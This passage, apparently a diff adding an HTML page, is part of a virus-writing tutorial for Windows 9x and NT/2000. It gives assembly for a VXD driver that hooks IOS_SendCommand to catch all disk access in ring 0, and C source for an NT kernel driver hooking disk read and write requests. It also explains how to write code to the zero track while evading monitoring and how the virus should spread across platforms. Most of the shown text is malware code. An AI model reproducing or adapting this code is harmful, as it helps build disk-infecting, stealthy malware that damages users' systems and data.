+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span> &nbsp; &nbsp; &nbsp;error<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; hVxD<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;handle of the driver</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">0</span> <span style="color: #ff0000;">0</span> <span style="color: #ff0000;">0</span> <span style="color: #ff0000;">0</span> <span style="color: #ff0000;">0</span> NULL <span style="color: #ff0000;">1</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;hVxD<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;DeviceIoControl &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;active VXD driver</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;VxDName <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;\\.\driver.vxd&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;hVxD &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> ?<br/>
+&nbsp;</div>
+<h4><a name="p332"></a>3.3.2. What's inside?</h4>
+<p>Our final VXD driver couldn't be too complex, we will hook only one VMM service, no special calling we shouldn't use.</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>386p<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; include vmm<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; include vwin32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br/>
+<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; DECLARE_VIRTUAL_DEVICE DRIVER<span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span> DRIVER_Control<span style="color: #339933;">,</span>\<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;UNDEFINED_DEVICE_ID<span style="color: #339933;">,</span> UNDEFINED_INIT_ORDER<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Begin_control_dispatch DRIVER<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Control_Dispatch Device_Init<span style="color: #339933;">,</span> OnDeviceIoControl<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; End_control_dispatch DRIVER<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; start of the driver</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; VxD_Locked_Code_Seg &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;LE segment</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; BeginProc OnDeviceIoControl &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;here VXD is starting...</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">100004h</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;IOS_SendCommand</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span>offset SC_Hook &nbsp;<span style="color: black; font-style: italic;">;address of the hooked function</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">VMMCall</span> Hook_Device_Service <span style="color: black; font-style: italic;">;hook that service</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span>sc_orig_func<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp;<span style="color: black; font-style: italic;">;original hooked address</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;no error</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; EndProc OnDeviceIoControl<br/>
+&nbsp;</div>
+<p>That's all for now. Just we hooked one VMM function: IOS_SendCommand, in SC_Hook function we will catch all system access through ring0.</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; BeginProc SC_Hook<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; this service has the same params like IOS_SendCommand func.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; &nbsp;esi ... IOR structure &nbsp;\ &nbsp;more in DDK 98</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; &nbsp;edi ... DCB structure &nbsp;/</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pusha</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span>sc_already_inside<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span> &nbsp;<span style="color: black; font-style: italic;">;re-call ?</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; sc_exit<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span>sc_already_inside<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span>sc_ior_address<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp;<span style="color: black; font-style: italic;">;save IOR structure address</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; in AL will be a drive letter from where the request comes</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>IOR_vol_designtr<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jb</span> &nbsp; &nbsp; &nbsp;sc_finish &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;A,B drives ?</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span>sc_drive_letter<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span> &nbsp;<span style="color: black; font-style: italic;">;save it, bcos of multi-disks</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; get the called reason: reading, writting, verifying...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>IOR_func<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; get started address in sectors</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>IOR_start_addr<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;checking if this value is <span style="color: #00007f; font-weight: bold;">in</span> the encrypted area<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; get output buffer</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>IOR_buffer_ptr<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span> &nbsp; &nbsp;<span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>IOR_Flags<span style="color: #339933;">,</span>IORF_SCATTER_GATHER<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; if this flag is set the output address is given like SGD</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span> &nbsp; &nbsp; &nbsp;sc_physical<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">+</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;get real output address</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;sc_physical<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span>sc_output_buf<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; own algorithm</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
+&nbsp;</div>
+<p>There're two ways of rerturning to the host either returning status code or by callbacks. I remember when I was coding VXD driver I had some problems with callbacks so I will do the best you wouldn't stay in dark.</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; go to the original function</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span>sc_orig_func<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;call IOS_SendCommand</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">OR</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; set the callback</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span>sc_ior_address<span style="color: black;">&#93;</span> &nbsp; &nbsp;<span style="color: black; font-style: italic;">;get IOR structure address</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>IOR_callback &nbsp;<span style="color: black; font-style: italic;">;get old callback address</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>IOR_callback<span style="color: #339933;">,</span>offset sc_callback<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span>sc_old_callback<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popa</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span>sc_orig_funct<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;call IOS_SendCommand</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;sc_callback<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pusha</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popa</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span>sc_old_callback<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;is there any old cback. ?</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span> &nbsp; &nbsp; &nbsp;sc_wn_exit_ret &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span>sc_old_callback<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;yeah, jump there</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;sc_wn_exit_ret<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;no callback</span><br/>
+&nbsp;</div>
+<h4><a name="p333"></a>3.3.3. How to load DOS driver</h4>
+<p>Again we have two solutions how to write a code on the zero track.</p>
+<ul>
+<li>using 0x13 service: it's the easiest way but I'd never used it because many eyes can watch you, even i know one case when calling 0x13 was disabled.</li>
+<li>using your VXD driver: just you will a instigation to the driver and it will write instead you: if the driver is initialized, it will check partition code and accordingly it act on itself.</li>
+</ul>
+<p>The main problem is we cant load the driver the same methods like in Win9x because WinNT/2k don't support 0x13 service. So if the virus is both for Win9x and for WinNT/2k, is better when the DOS driver will be loaded rather from WinNT/2k because from Win9x isn't easy to load WinNT/2k driver than from WinNT/2k to load VXD driver. I'd recommend for this situation to spread virus itself on Win9x/ME platform and it don't load any drivers here as long as the user won't run an infected file from WinNT/2k.</p>
+<h3><a name="p34"></a>3.4. WinNT/2k driver</h3>
+<p>This'll be the very interesting chapter because I don't have any books to help me, no tutorials I have, it goes from my own experience. Anyway you will have to download Microsoft Device Development Kit for Win2000/ME from the MS web site (it has something about 65Mb).</p>
+<h4><a name="p341"></a>3.4.1. How to compile the driver</h4>
+<p>After installing DDK2k/Me you will get some their tools and subsequently you can adjust your MS Visual C++ setting to code it from this pleasure environment, or the 2nd side is go to DOS and create these files:</p>
+<pre>
+        SOURCES.                            ;create this file
+
+            TARGETNAME=DRIVER               ;the name of the driver
+            TARGETPATH=c:\my_work\virus     ;driver's directory
+            TARGETTYPE=DRIVER               ;type
+            LINKER_FLAGS=-MAP               ;some parameters for linking
+
+            INCLUDES=C:\NT\INC              ;where you have INC files, re-
+                                            ;commend use VC++ INC directory
+            SOURCES=driver.c                ;the name of the driver's file
+</pre>
+<p>To compile the driver write:</p>
+<pre>        BUILD.EXE -w -b</pre>
+<h4><a name="p342"></a>3.4.2. Driver Source</h4>
+<p>All comments to the driver will be dip into the source.</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">#include &lt;ntddk.h&gt;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">#include &quot;driver.h&quot;</span><br/>
+<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// The &nbsp;name &nbsp;of &nbsp;the &nbsp;driver which we will hook, in SoftICE you can</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// write &nbsp;&quot;DEVICE&quot; or &quot;DRIVER&quot; to look at those. Mark &quot;%d&quot; means the</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// number of physical disk device (0 = C: drive)</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">#define DiskDeviceName &quot;\\Device\\HardDisk%d&quot;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">#ifdef ALLOC_PRAGMA</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">#pragma alloc_text(INIT,DriverEntry)</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">#endif</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// After initialization WinNT/2k call as the first this function.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; NTSTATUS DriverEntry<span style="color: black;">&#40;</span>PDRIVER_OBJECT DriverObject<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PUNICODE_STRING RegistryPath<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// devExt is the shared structure for all driver's parts</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PDEVICE_EXTENSION devExt<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// new hooked device object</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PDEVICE_OBJECT &nbsp; &nbsp;hookDevice<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; UNICODE_STRING &nbsp; &nbsp;unicodeDiskName<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ANSI_STRING &nbsp; &nbsp; &nbsp; DiskNameA<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NTSTATUS &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;status<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; UCHAR &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DiskName<span style="color: black;">&#91;</span><span style="color: #0000dd;">200</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ULONG &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i<span style="color: #339933;">;</span><br/>
+<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// For now we don't have selected any callbacks</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i<span style="color: #339933;">&lt;=</span>IRP_MJ_MAXIMUM_FUNCTION<span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DriverObject<span style="color: #339933;">-&gt;</span>MajorFunction<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> Dispatch<span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// If the system send any read/write/... request we can set some</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// routine which will catch this.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DriverObject<span style="color: #339933;">-&gt;</span>MajorFunction<span style="color: black;">&#91;</span>IRP_MJ_READ<span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> Read<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DriverObject<span style="color: #339933;">-&gt;</span>MajorFunction<span style="color: black;">&#91;</span>IRP_MJ_WRITE<span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> Write<span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Create new device object.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; status <span style="color: #339933;">=</span> IoCreateDevice<span style="color: black;">&#40;</span>DriverObject<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>DEVICE_EXTENSION<span style="color: black;">&#41;</span><span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FILE_DEVICE_DISK<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FALSE<span style="color: #339933;">,</span><br/>
